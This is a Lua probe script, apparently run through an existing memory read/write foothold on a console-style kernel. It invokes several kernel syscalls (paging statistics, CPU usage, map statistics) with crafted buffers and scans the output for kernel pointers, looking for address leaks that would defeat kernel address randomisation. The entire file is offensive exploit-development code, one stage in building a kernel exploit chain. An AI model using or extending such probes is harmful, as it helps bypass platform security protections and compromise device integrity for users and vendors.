-- CRASH_CLASS: MODERATE
-- PROBE 1033a: do the "all threads / all objects / cpu-all" enumerators leak addresses?
print("=== PROBE 1033a ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function A(x) return uint64(string.format("0x%X", to_num(x))) end
local function hi_of(q) if type(q)=="table" and q.h then return q.h, q.l end return 0, to_num(q) end
local function make_syscall(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rq(addr) local ok,v=pcall(function() return memory.read_qword(addr) end) if ok then return v end return nil end
local function rd(addr) local ok,v=pcall(function() return memory.read_dword(addr) end) if ok then return to_num(v) end return -1 end
local function wq(addr,val) pcall(function() memory.write_qword(addr,val) end) end
local function wd(addr,val) pcall(function() memory.write_dword(addr,val) end) end
local shield=make_syscall(416)
local sa=memory.alloc(0x40)
for i=0,7 do wq(sa+i*8,0) end
wd(sa,1)
print("[S] shield="..tostring(shield(A(sa),A(0),A(0)):tonumber()))
local BUF=0x800
local buf=memory.alloc(BUF+0x100)
local function zero() for i=0,BUF/8 do wq(buf+i*8,0xFEFEFEFEFEFEFEFE) end end
local function scan(tag)
  local kp=0; local first=""
  for i=0,BUF/8-1 do
    local v=rq(buf+i*8)
    if v then
      local h,l=hi_of(v)
      if h>=0xFFFF8000 and not (l==0xFFFFFFFF and h==0xFFFFFFFF) then
        kp=kp+1
        if kp<=3 then first=first..string.format(" +%X=%X_%08X", i*8, h, l) end
      end
    end
  end
  print(string.format("[%s] kp=%d%s", tag, kp, first))
end
local pids=memory.alloc(8); wd(pids,0)
local function call(tag, num, args)
  zero()
  local sc=make_syscall(num)
  local ok,v=pcall(function() return sc(A(args[1] or 0), A(args[2] or 0), A(args[3] or 0), A(args[4] or 0), A(args[5] or 0), A(args[6] or 0)) end)
  local rv = ok and to_num(v) or -999
  print(string.format("[%s] rv=%s q0=%X q1=%X q2=%X", tag, tostring(rv), rd(buf), rd(buf+4), rd(buf+8)))
  scan(tag)
end
-- 611 get_paging_stats_of_all_threads
call("611a", 611, {buf, BUF, 0, 0})
call("611b", 611, {0, buf, BUF, 0})
call("611c", 611, {buf, BUF, pids, 0})
-- 618 get_paging_stats_of_all_objects
call("618a", 618, {buf, BUF, 0, 0})
call("618b", 618, {0, buf, BUF, 0})
-- 627 get_cpu_usage_all
call("627a", 627, {buf, BUF, 0, 0})
call("627b", 627, {0, buf, BUF, 0})
-- 641 get_cpu_usage_proc (self)
local mypid=to_num(make_syscall(20)(uint64(0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)))
call("641a", 641, {mypid, buf, BUF, 0})
call("641b", 641, {0, buf, BUF, 0})
-- 642 get_map_statistics (self)
call("642a", 642, {mypid, buf, BUF, 0})
call("642b", 642, {0, buf, BUF, 0})
print("[Z] alive")
